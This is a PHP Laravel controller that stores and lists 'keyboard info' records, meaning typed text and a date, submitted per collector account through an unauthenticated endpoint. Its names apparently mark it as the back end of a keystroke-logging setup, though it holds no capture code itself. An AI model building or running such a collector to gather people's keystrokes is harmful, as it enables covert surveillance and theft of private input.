<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\KeyboardInfo;
use App\CollectorUser;

class KeyboardController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $search = \Request::get('search'); //<-- we use global request to get the param of URI
        
        $user = CollectorUser::where('account', '=', $search)->first();
        if($user === null){
            $data =  KeyboardInfo::paginate(20);
        }else{
            $data = KeyboardInfo::where('user_id', '=', $user->id)->paginate(20);
        }

        return view('data.keyboardindex')->with('data', $data);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $this->validate($request, [
            'text' => 'required',
            'date' => 'required',
            'account' => 'required'
        ]);

        $user = CollectorUser::where('account', '=', $request->input('account'))->first();
        if($user === null){
            $usernew = new CollectorUser;
            $usernew->account = $request->input('account');
            
            try{ 
                $usernew->save();  
            }catch(\Exception $e){
                #ignore
            }

            $user = $usernew;
        }

        $key = new KeyboardInfo;
        $key->text = $request->input('text');
        $key->date = $request->input('date');

        $user->keyboardinfos()->save($key);
        $key->collectoruser()->associate($user);

        try{
            $key->save();
            }catch(\Exception $e){
                // do task when error
                echo $e->getMessage();   // insert query
             }
            
            return response('OK SERVER', 200);
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        $key = KeyboardInfo::find($id);
        $key->delete();
        return redirect('collector/keyboard')->with('success', 'Keyboard Record Removed');
    }
}
